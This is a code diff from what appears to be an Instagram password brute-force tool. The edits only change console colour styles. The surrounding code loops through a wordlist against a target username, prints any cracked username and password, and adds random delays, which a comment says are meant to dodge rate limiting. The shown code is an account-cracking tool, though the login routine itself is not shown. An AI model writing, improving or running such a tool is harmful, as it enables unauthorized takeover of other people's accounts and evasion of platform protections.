@@ -145,9 +145,9 @@ def get_wordlist():
   try:
     available_wordlists = [f for f in os.listdir(wordlist_dir) if f.endswith('.txt')]
     if available_wordlists:
-      console.print("\n:: Available wordlists ::", justify="center", style="#CYAN")
+      console.print("\n:: Available wordlists ::", justify="center", style="cyan")
       for idx, wl in enumerate(available_wordlists, 1):
-        console.print(f"{idx}. {wl}", justify="center", style="#GREEN")
+        console.print(f"{idx}. {wl}", justify="center", style="green")
   except:
     pass
 
@@ -178,21 +178,21 @@ def insta_bruteforce(username, wordlist, vpn):
       try:
         os.system("clear")
         console.print(ascii_art, justify="center", style="#B0DAFF bold")
-        console.print(f"[{idx}/{total_passwords}] Testing: {password[:20]}{'...' if len(password) > 20 else ''}", justify="center", style="#CYAN")
+        console.print(f"[{idx}/{total_passwords}] Testing: {password[:20]}{'...' if len(password) > 20 else ''}", justify="center", style="cyan")
 
         result = insta_pass(username, password)
 
         if result == True:
           os.system("clear")
           console.print(ascii_art, justify="center", style="#B0DAFF bold")
-          console.print(f"\n{color.GREEN}[+] PASSWORD FOUND: {password}{color.END}\n", justify="center", style="#13f41e bold")
-          console.print(f"Username: @{username}", justify="center", style="#13f41e")
-          console.print(f"Password: {password}", justify="center", style="#13f41e bold")
+          console.print(f"\n{color.GREEN}[+] PASSWORD FOUND: {password}{color.END}\n", justify="center", style="bold green")
+          console.print(f"Username: @{username}", justify="center", style="green")
+          console.print(f"Password: {password}", justify="center", style="bold green")
           exit()
         else:
           os.system("clear")
           console.print(ascii_art, justify="center", style="#B0DAFF bold")
-          console.print(f"[{idx}/{total_passwords}] Failed: {password[:30]}{'...' if len(password) > 30 else ''}", justify="center", style="#ea0408 bold")
+          console.print(f"[{idx}/{total_passwords}] Failed: {password[:30]}{'...' if len(password) > 30 else ''}", justify="center", style="bold red")
 
           # Add delay to avoid rate limiting
           delay = random.randint(2, 5)
